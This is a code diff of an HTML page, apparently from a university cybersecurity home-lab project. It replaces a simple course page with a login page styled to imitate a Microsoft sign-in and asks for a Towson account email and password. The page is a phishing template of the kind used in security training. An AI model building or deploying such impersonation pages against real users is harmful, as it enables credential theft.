@@ -1,33 +1,118 @@
 <!DOCTYPE html>
-<html>
- <head>
-  <title>The Cyber Security Home Lab Page - Special Topics in Computer Science</title>
- </head>
- <body>
-   <h1 style="text-align:center;">The Cyber Security Home Lab Page</h1>
-   <h2 style="text-align:center;">Special Topics in Computer Science</h2>
-   
-   <h3 style="text-align:center;">
-     By: Kevin Seldomridge, Stephen Hayes<br>
-     COSC 650, Towson University<br>
-     Towson, Maryland<br>
-     {kseldom1, shayes11}@students.towson.edu
-   </h3>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Microsoft Login - Emulation</title>
+  <style>
+    /* Basic Reset */
+    body, h1, p, form, input, button {
+      margin: 0;
+      padding: 0;
+      font-family: Segoe UI, Tahoma, Geneva, sans-serif;
+    }
+    body {
+      background-image: url('illustration.png');
+      background-size: cover;
+      background-repeat: no-repeat;
+      background-position: center;
+    
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
 
-   <h3 style="text-align:center;">
-     Professor Alex Hornberger<br>
-     COSC 650, Towson University<br>
-     Towson, Maryland
-   </h3>
-  <form action="/submit" method="post" style="text-align:center;">
-    <label for="username">Username:</label>
-    <input type="text" id="username" name="username"><br><br>
-    <label for="password">Password:</label>
-    <input type="password" id="password" name="password"><br><br>
-    <input type="submit" value="Submit">
-  </form>
-   <p style="text-align:center;">
-     <img src="cyberdemologo.jpeg" width="500" height="500" alt="Cybersecurity Home Lab Logo">
-   </p> 
- </body>
+    .login-container {
+      position: relative;
+      z-index: 2;
+      background-color: white;
+      padding: 40px 40px 20px;
+      border-radius: 8px;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+      width: 350px;
+    }
+
+    /* Logo */
+    .logo {
+      display: block;
+      width: 150px;
+      margin: 0 auto;
+      margin-bottom: 30px;
+    }
+
+    /* Header */
+    .login-header {
+      font-size: 18px;
+      text-align: center;
+      font-weight: bold;
+      margin-bottom: 20px;
+    }
+
+    .overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.5); /* Adjust the opacity as needed */
+      z-index: 1;
+    }
+
+    /* Input Styles */
+    input[type="email"], input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #d1d1d1;
+      border-radius: 4px;
+    }
+
+    /* Submit Button */
+    button[type="submit"] {
+      width: 100%;
+      padding: 10px;
+      background-color: #0078d4;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    /* Links */
+    .forgot-password, .create-account {
+      display: block;
+      text-align: center;
+      margin-top: 10px;
+      color: #0078d4;
+      font-size: 14px;
+    }
+
+    .forgot-password:hover, .create-account:hover {
+      text-decoration: underline;
+    }
+
+  </style>
+</head>
+<body>
+  <div class="overlay"></div>
+  <div class="login-container">
+    <!-- Microsoft logo (replace with actual logo if needed) -->
+    <img src="bannerlogo.png" alt="Microsoft Logo" class="logo">
+    
+    <!-- Login Form -->
+    <div class="login-header">Sign in with your Towson account</div>
+    <form action="/submit" method="POST">
+      <input type="email" placeholder="Email" required>
+      <input type="password" placeholder="Password" required>
+      <button type="submit">Next</button>
+    </form>
+    
+    <!-- Links -->
+    <a href="#" class="forgot-password">Forgot your password?</a>
+    <a href="#" class="create-account">Create one!</a>
+  </div>
+  
+</body>
 </html>
